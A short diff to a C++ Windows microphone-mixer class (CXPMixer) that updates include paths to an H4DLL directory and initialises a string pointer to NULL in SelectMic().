@@ -1,7 +1,7 @@
 #include <stdio.h>
-#include "..\common.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
 #include "XpMic.h"
-#include "..\HM_SafeProcedures.h"
 
 CXPMixer::CXPMixer(BOOL bCalibration, UINT uThreshold, INT iSilence)
 	:	bSilence(FALSE), iSilenceBlock(0)
@@ -239,7 +239,7 @@ BOOL CXPMixer::SelectMic()
 	UINT lVal;
 	BOOL bRetVal = FALSE;
 
-	CHAR *m_strDstLineName, *m_strSelectControlName, *m_strMicName;
+	CHAR *m_strDstLineName, *m_strSelectControlName, *m_strMicName = NULL;
 	DWORD m_dwControlType, m_dwSelectControlID, m_dwMultipleItems, m_dwIndex;
 	DWORD dwi,dwj;
 	MIXERLINE mxl;
